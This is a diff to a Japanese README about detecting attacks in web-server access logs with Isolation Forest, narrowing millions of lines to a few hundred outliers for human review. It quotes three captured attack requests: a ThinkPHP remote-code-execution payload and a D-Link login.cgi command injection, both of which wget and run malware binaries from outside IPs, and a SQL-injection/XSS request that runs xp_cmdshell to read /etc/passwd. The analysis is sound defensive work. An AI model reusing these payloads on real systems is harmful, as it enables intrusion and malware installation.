@@ -49,3 +49,29 @@ $ ./run.sh 2 0.30
 ```
 
 　当然、専門家が特徴を設定した方が良いが、適当な特徴でもそれなりに（分析には差し障りない程度に）良い結果が得られるようである。
+
+### 実用化のためには？
+
+- 上記BlogではJavaで書かれているが、それとほぼ同様のコードをpythonで書いた。[ipynb/viz02.ipynb](ipynb/viz02.ipynb)
+- ラベルのない1036万行のデータから、Isolation forestを繰り返すことで742行にした。[ipynb/result_by_ip.txt](ipynb/result_by_ip.txt)
+
+　全ての外れ値が真に攻撃であるならこれでOKなのだが、当然そうではないので、ここからは人間が確認していく。[ipynb/result_by_ip.txt](ipynb/result_by_ip.txt)の最初の29行ほどは/rapidGrails/jsonListリクエストが続く。まぁ攻撃ではないだろう。そして30行目に明確な攻撃が見つかる。
+ 
+ ```
+-0.7341514235140854 202.70.250.38 - - [24/Jan/2019:15:58:56 +0330] GET /index.php?s=/index/\x09hink\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\x00 400 166 - - -
+```
+
+　最初のパターンはindex.phpに対してshell_exec, wgetをするもの。他にも複数見つかる（32-50行目）。これをpattern1とする。続いて51行目。
+
+```
+-0.7335728824690786 176.121.14.183 - - [25/Jan/2019:12:07:57 +0330] GET /image/29000?name=6aba3c.jpg&amp%3Bwh=200x200&HMCj%3D1300%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1 200 1035 - Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b4) Gecko/2008031317 Firefox/3.0b4 -
+```
+
+　UNION, SELECT, script, alertが入ったもの。明らかに攻撃を意図したアクセス。これをpattern2。その後pattern1が続き、126行目に再びpattern2が出てくる。そして206行目。
+
+```
+-0.6859619404158754 151.25.29.64 - - [22/Jan/2019:05:55:47 +0330] GET /login.cgi?cli=aa%20aa%27;wget%20http://217.61.5.226/bins/Solstice.mips%20-O%20->%20/tmp/.Solstice;chmod%20777%20/tmp/.Solstice;/tmp/.Solstice%20dlink%27$ HTTP/1.1 400 166 - Solstice/2.0 -
+```
+
+　login.cgi, wgetが入ったもの。これをpattern3。
+
